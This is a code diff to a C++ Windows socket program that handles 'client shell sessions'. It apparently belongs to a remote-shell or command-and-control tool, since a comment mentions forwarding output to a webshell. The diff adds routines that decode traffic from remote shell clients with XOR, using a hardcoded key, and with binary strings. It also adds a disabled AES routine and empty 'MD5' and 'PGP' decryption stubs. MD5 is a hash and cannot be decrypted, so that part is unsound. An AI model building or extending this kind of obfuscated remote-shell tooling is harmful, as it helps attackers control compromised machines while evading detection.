@@ -13,6 +13,8 @@
 #include <chrono>
 #include <mutex>
 #include <Windows.h>
+//#include <openssl/aes.h> // AES 
+#include <bitset> // BIN
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -62,6 +64,59 @@ void xValidateAndSetEncryption(const std::string& yEncryptionMethod) {
 }
 
 
+//------------------------------------------------------------------------------------------AES DECRYPTION 
+/*
+std::string xDecryptAES(const std::string& yCiphertext, const std::string& yKey, const std::string& iv) {
+    AES_KEY decryptKey;
+    AES_set_decrypt_key(reinterpret_cast<const unsigned char*>(yKey.c_str()), 128, &decryptKey);
+
+    std::string yDecryptedText;
+    yDecryptedText.resize(yCiphertext.size());
+
+    AES_decrypt(reinterpret_cast<const unsigned char*>(yCiphertext.c_str()),
+        reinterpret_cast<unsigned char*>(&yDecryptedText[0]),
+        &decryptKey);
+
+    return yDecryptedText;
+} */
+
+
+//------------------------------------------------------------------------------------------XOR DECRYPTION 
+std::string xDecryptXOR(const std::string& yCiphertext, const std::string& yKey) {
+    std::string yDecryptedText;
+    yDecryptedText.reserve(yCiphertext.length());
+
+    for (std::size_t i = 0; i < yCiphertext.length(); ++i) {
+        yDecryptedText += yCiphertext[i] ^ yKey[i % yKey.length()];
+    }
+
+    return yDecryptedText;
+}
+
+
+//------------------------------------------------------------------------------------------BIN DECRYPTION 
+std::string xDecryptBinary(const std::string& yEncryptedText) {
+    std::string yDecryptedText;
+
+    for (size_t i = 0; i < yEncryptedText.length(); i += 8) {
+        std::string byte = yEncryptedText.substr(i, 8);
+
+        unsigned char yDecryptedByte = std::bitset<8>(byte).to_ulong();
+
+        yDecryptedText += yDecryptedByte;
+    }
+
+    return yDecryptedText;
+}
+
+
+//------------------------------------------------------------------------------------------MD5 DECRYPTION 
+
+
+//------------------------------------------------------------------------------------------PGP DECRYPTION 
+
+
+
 //------------------------------------------------------------------------------------------HANDLE CLIENT SHELL SESSION FUNCTION
 void xHandleClient(SOCKET clientSocket) {
     char yBuffer[1024];
@@ -78,7 +133,37 @@ void xHandleClient(SOCKET clientSocket) {
         std::string yCommand(yBuffer, yBytesRead); // Received Data -> Output
         {
             std::lock_guard<std::mutex> lock(mtx);
-            std::cout << std::endl << yCommand << std::endl;
+
+            // Decrypt the command based on yGlobalEncryption
+            if (yGlobalEncryption == 1) {
+                std::string yDecryptedCommand /*= xDecryptAES(yCommand, aesKey, aesIV)*/;
+                std::cout << std::endl << yDecryptedCommand << std::endl;
+            }
+
+            else if (yGlobalEncryption == 2) {
+                const std::string xorKey = "HUNT3RkEyGenx23KKkwzQUdAq";
+                std::string yDecryptedCommand = xDecryptXOR(yCommand, xorKey);
+                std::cout << std::endl << yDecryptedCommand << std::endl;
+            }
+
+            else if (yGlobalEncryption == 3) {
+                std::string yDecryptedText = xDecryptBinary(yCommand);
+                std::cout << std::endl << yDecryptedText << std::endl;
+            }
+
+            else if (yGlobalEncryption == 4) {
+                // Decrypt using MD5
+            }
+
+            else if (yGlobalEncryption == 5) {
+                // Decrypt using PGP
+            }
+
+            else if (yGlobalEncryption == 0) {
+                std::cout << std::endl << yCommand << std::endl;
+            }
+
+            //std::cout << std::endl << yCommand << std::endl;
 
             //xSendAjaxRequest(xClientID, yCommand); // Received Output -> Ajax -> Webshell
         }
